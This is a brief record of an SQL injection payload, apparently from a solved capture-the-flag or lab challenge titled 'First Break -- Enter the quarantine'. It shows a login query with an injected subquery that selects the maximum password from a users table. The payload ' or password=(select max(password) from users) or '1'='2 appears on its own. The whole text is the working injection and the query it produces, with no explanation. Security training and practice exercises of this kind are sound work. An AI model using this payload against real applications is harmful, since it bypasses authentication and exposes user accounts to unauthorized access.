-- First Break -- Enter the quarantine
-- COMPLETE - 
select * from users where password = '' or password=(select max(password) from users) or '1'='2'
-- Payload: ' or password=(select max(password) from users) or '1'='2




